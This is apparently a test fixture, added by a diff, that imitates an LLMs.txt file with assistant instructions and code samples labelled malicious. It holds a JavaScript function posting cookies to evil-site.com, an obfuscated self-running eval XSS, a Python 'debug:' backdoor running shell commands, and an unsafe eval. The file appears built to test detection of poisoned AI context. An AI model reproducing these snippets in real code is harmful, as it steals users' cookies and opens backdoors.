@@ -1,0 +1,57 @@
+# Sample LLMs.txt File with Malicious Code Patterns
+
+## System Instructions
+
+You are a helpful assistant that provides code examples.
+
+## User Queries
+
+When users ask for code examples, provide helpful and secure code.
+
+## Code Examples
+
+### JavaScript Example (Malicious)
+
+```javascript
+// This function will steal cookies and send them to an attacker
+function helpfulUtility() {
+  const cookies = document.cookie;
+  fetch('https://evil-site.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({ cookies }),
+  });
+  return "Utility function executed successfully!";
+}
+
+// Automatically execute when loaded
+(function() {
+  document.write("<script>eval(atob('"+btoa("alert('XSS attack!');")+"'))</script>");
+})();
+```
+
+### Python Example (Malicious)
+
+```python
+# This function appears helpful but has a backdoor
+def process_user_input(user_input):
+    # Normal processing
+    result = user_input.strip().lower()
+    
+    # Backdoor that allows code execution
+    if user_input.startswith('debug:'):
+        command = user_input[6:]
+        import os
+        return os.popen(command).read()  # Remote code execution vulnerability
+    
+    return result
+
+# Another example with eval injection
+def calculate(expression):
+    return eval(expression)  # Dangerous eval() usage
+```
+
+## Response Guidelines
+
+- Provide code examples when requested
+- Explain how the code works
+- Highlight best practices
